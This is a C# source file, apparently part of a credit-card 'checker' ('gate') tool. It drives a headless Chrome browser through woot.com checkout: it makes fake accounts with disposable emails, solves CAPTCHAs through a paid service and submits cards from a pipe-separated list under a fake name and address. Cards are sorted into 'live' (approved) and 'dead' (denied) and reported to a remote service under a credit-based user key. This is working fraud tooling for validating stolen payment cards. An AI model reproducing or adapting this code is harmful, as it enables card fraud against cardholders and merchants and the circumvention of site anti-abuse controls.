using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace gateDanny.gates
{
    class Woot
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        private bool tiempoElementoeMAIL(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='refresh']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        private bool tiempoElementoeMAILTR(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='inbox']/table/tbody/tr")))
                    {
                        driver.FindElement(By.XPath("//*[@id='inbox']/table/tbody/tr")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }

         
            if (Thunder._Form1.numcc() > 0 && Variables.run == true)
            {
                try
                {



                    Thunder._Form1.update_progresbar(5);
                    var chromeOptions = new ChromeOptions();
                    correo = "joseffernana" + getNum() + "@gmail.com";
                    clave = "Jo." + getNum();

                    //chromeOptions.AddArguments(new List<string>() { "headless" });
                    //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, 
                    chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--ignore-certificate-errors", "--headless"); //

                    var chromeDriverService = ChromeDriverService.CreateDefaultService();
                    chromeDriverService.HideCommandPromptWindow = true;
                    //https://www.shopbop.com/jewelry-accessories/br/v=1/13539.htm
                    driver = new ChromeDriver(chromeDriverService, chromeOptions);
                    driver.Url = "https://www.woot.com/alldeals?ref=w_gw_zl_bs_all&selectedSort=plh";
                    Thread.Sleep(1000);
                    correo = "joseffernana" + getNum() + "@hotmail.com";

                    var producto = "/html/body/div[2]/div/div/div/div[2]/div[2]/div/div/div/div["+RandomNumber(1,4)+"]/div/div["+RandomNumber(1,3)+"]/a";

                    if (tiempoElemento(By.XPath(producto)))
                    {
                        driver.FindElementByXPath(producto).Click();
                        Thread.Sleep(1000);

                        Thunder._Form1.update_progresbar(20);

                        if (tiempoElemento(By.LinkText("Add to cart")))
                        {
                            if (IsElementPresent(By.Id("attr-cape:")))
                            {
                                try
                                {
                                    var select = new SelectElement(driver.FindElementById("attr-cape:"));
                                    select.SelectByIndex(1);
                                }
                                catch (Exception ex)
                                {

                                    Console.WriteLine(ex);
                                }
                                
                                Thread.Sleep(1000);
                            }

                            if (IsElementPresent(By.Id("attr-color")))
                            {
                                
                                try
                                {
                                    var select = new SelectElement(driver.FindElementById("attr-color"));
                                    select.SelectByIndex(1);
                                }
                                catch (Exception ex)
                                {

                                    Console.WriteLine(ex);
                                }
                               
                                Thread.Sleep(1000);
                            }
                            if (IsElementPresent(By.Id("attr-size")))
                            {
                                try
                                {
                                    var select = new SelectElement(driver.FindElementById("attr-size"));
                                    select.SelectByIndex(1);
                                }
                                catch (Exception ex)
                                {

                                    Console.WriteLine(ex);
                                }
                               
                                Thread.Sleep(1000);
                            }

                            driver.FindElementByLinkText("Add to cart").Click();
                            Thread.Sleep(500);
                            if (tiempoElemento(By.XPath("//*[@id='minicart']/div/footer/a[1]")))
                            {
                                Thunder._Form1.update_progresbar(30);
                                driver.FindElementByXPath("//*[@id='minicart']/div/footer/a[1]").Click();
                                Thread.Sleep(500);
                                if (tiempoElemento(By.Id("createAccountSubmit")))
                                {
                                  
                                    driver.FindElementById("createAccountSubmit").Click();
                                    Thread.Sleep(500);
                                    if (tiempoElemento(By.XPath("//*[@id='ap_customer_name']")))
                                    {
                                        GetEmail();
                                        Thunder._Form1.update_progresbar(60);
                                        Thread.Sleep(500);

                                        if (tiempoElemento(By.XPath("//*[@id='ap_customer_name']")))
                                        {

                                            Thunder._Form1.update_progresbar(70);
                                            driver.FindElement(By.XPath("//*[@id='ap_customer_name']")).SendKeys("joseffernana" + getNum());
                                            Thread.Sleep(500);
                                            driver.FindElement(By.XPath("//*[@id='ap_email']")).SendKeys(correo);
                                            Thread.Sleep(500);
                                            driver.FindElement(By.XPath("//*[@id='ap_password']")).SendKeys(clave);
                                            Thread.Sleep(500);
                                            driver.FindElement(By.XPath("//*[@id='ap_password_check']")).SendKeys(clave);
                                            Thread.Sleep(500);
                                            driver.FindElement(By.XPath("//*[@id='continue']")).Click();
                                            Thread.Sleep(500);
                                            Thread.Sleep(2000);
                                            var a = true;
                                            var captche = "";
                                            var imgCaptche = "";
                                            if (IsElementPresent(By.XPath("//*[@id='cvf-page-content']/div/div/div/div[2]/div/img")))
                                            {
                                                a = false;
                                                imgCaptche = driver.FindElement(By.XPath("//*[@id='cvf-page-content']/div/div/div/div[2]/div/img")).GetAttribute("src");
                                                Thread.Sleep(100);
                                            }

                                            ResolveCaptcha resolve = new ResolveCaptcha(Variables.key_captcha);
                                            var intentos = 1;
                                            while (a == false && intentos < 4)
                                            {
                                                captche = resolve.Image(imgCaptche);
                                                if (captche is null)
                                                {
                                                    a = false;
                                                }
                                                else
                                                {
                                                    driver.FindElement(By.XPath("//*[@id='cvf-page-content']/div/div/div/form/div[2]/input")).SendKeys(captche);
                                                    Thread.Sleep(500);
                                                    driver.FindElement(By.Name("cvf_captcha_captcha_action")).Click();
                                                    Thread.Sleep(1000);
                                                    if (IsElementPresent(By.XPath("//*[@id='cvf-page-content']/div/div/div/form/div[3]/div/div/div/div")))
                                                    {
                                                        a = false;
                                                        captche = null;
                                                    }
                                                    else
                                                    {
                                                        Thunder._Form1.update_progresbar(80);
                                                        a = true;
                                                    }

                                                }
                                                Thread.Sleep(1000);
                                                intentos++;
                                            }

                                            if (IsElementPresent(By.XPath("//*[@id='cvf-page-content']/div/div/div/form/div[2]/input")))
                                            {
                                                restart();
                                            }

                                            Thread.Sleep(1000);

                                            if (tiempoElemento(By.Id("ShippingAddress_FullName")))
                                            {
                                                pago();
                                               
                                            }
                                            else
                                            {
                                                restart();

                                            }

                                           


                                        }
                                        else
                                        {
                                            restart();
                                        }

                                    }
                                    else
                                    {
                                        restart();
                                    }
                                }
                                else
                                {
                                    restart();
                                }

                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }
                
                    




                }
                catch (Exception ex)
                {

                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                        stop();
                    }
                }

            }
            else
            {
                stop();
            }
        }

        private void GetEmail()
        {
            try
            {
                //###--obtener email--#####
                ((IJavaScriptExecutor)driver).ExecuteScript("window.open();");
                driver.SwitchTo().Window(driver.WindowHandles.Last());
                Thread.Sleep(300);
                driver.Url = "https://www.abandonmail.com/es";
                Thread.Sleep(5000);

                if (tiempoElemento(By.XPath("//*[@id='randombtn']")))
                {
                    driver.FindElement(By.XPath("//*[@id='randombtn']")).Click();
                    Thread.Sleep(1000);
                }
                else
                {

                    restart();
                }

                if (tiempoElemento(By.XPath("//*[@id='emailtouse']")))
                {
                    correo = driver.FindElement(By.XPath("//*[@id='emailtouse']")).GetAttribute("value");
                    Thread.Sleep(1000);
                }
                else
                {

                    restart();
                }

                Thread.Sleep(1000);

                driver.SwitchTo().Window(driver.WindowHandles.First());
            }
            catch (Exception ex)
            {


                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    stop();
                }
            }






        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1500);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
               

                if (Thunder._Form1.numcc() > 0 && Variables.run == true)
                {
                    if (pagos < 10)
                    {
                        Thunder._Form1.update_progresbar(90);
                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];




                        if (IsElementPresent(By.Id("ShippingAddress_FullName")))
                        {
                            if (pagos == 0)
                            {
                                driver.FindElementById("ShippingAddress_FullName").SendKeys("JOSE REYES");
                                Thread.Sleep(100);
                                driver.FindElementById("ShippingAddress_Address1").SendKeys("STREET " + RandomNumber(100, 900));
                                Thread.Sleep(100);
                                driver.FindElementById("ShippingAddress_City").SendKeys("MIAMI");
                                Thread.Sleep(100);
                                var ESTADO = new SelectElement(driver.FindElementById("ShippingAddress_State_USA"));
                                ESTADO.SelectByValue("FL");
                                Thread.Sleep(1000);
                                driver.FindElementById("ShippingAddress_PostalCode").SendKeys("33206");
                                Thread.Sleep(100);
                                driver.FindElementById("ShippingAddress_Phone").SendKeys("218521" + RandomNumber(1000, 9999));
                                Thread.Sleep(1000);
                            }

                            if (pagos == 0)
                            {
                                driver.FindElementById("PaymentMethod_Name").SendKeys("JOSE REYES");
                                Thread.Sleep(1000);
                            }
                            
                            driver.FindElementById("PaymentMethod_Number").SendKeys(ccnum);
                            Thread.Sleep(500);
                            var mes = new SelectElement(driver.FindElementById("PaymentMethod_ExpirationMonth"));
                            mes.SelectByValue(ccLine[1]);
                            Thread.Sleep(1000);
                            var anio = new SelectElement(driver.FindElementById("PaymentMethod_ExpirationYear"));
                            anio.SelectByValue(ccLine[2]);
                            Thread.Sleep(1000);
                            driver.FindElement(By.XPath("//*[@id='payment-settings']/div/input")).Click();
                            Thread.Sleep(1000);

                            if (tiempoElemento(By.Id("use-original-values")))
                            {
                                driver.FindElementById("use-original-values").Click();
                                Thread.Sleep(1000);
                                if (tiempoElemento(By.XPath("//*[@id='order-totals']/button")))
                                {
                                    driver.FindElementByXPath("//*[@id='order-totals']/button").Click();
                                    Thread.Sleep(3000);
                                }
                                else
                                {
                                    restart();
                                }
                            }
                            else
                            {
                                restart();
                            }


                        }
                        else
                        {
                            restart();
                        }

                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = checkbin(cc.Substring(0, 6));
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }
            }
            catch (Exception ex)
            {
                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    stop();
                    return;
                }
                //MessageBox.Show(ex.ToString());
              
            }

        }


     
        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.XPath("//*[@id='content']/h2")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='content']/h2")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='content']/h2")).Text.Trim() == "Denied")
                            {

                                estado = "dead";

                            }



                        }
                    }

                    if (IsElementPresent(By.Id("review-order")))
                    {
                        if (driver.FindElement(By.Id("review-order")).Displayed == true)
                        {
                            if (driver.FindElement(By.Id("review-order")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }




                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                Thread.Sleep(500);
                driver.Navigate().GoToUrl("https://wantone.woot.com/");
                if (tiempoElemento(By.XPath("//*[@id='actions']/a")))
                {
                    driver.FindElementByXPath("//*[@id='actions']/a").Click();
                    Thread.Sleep(500);
                    if (tiempoElemento(By.LinkText("Edit")))
                    {
                        driver.FindElementByLinkText("Edit").Click();
                        Thread.Sleep(500);
                        return false;
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    restart();
                }
               

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }


      
        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

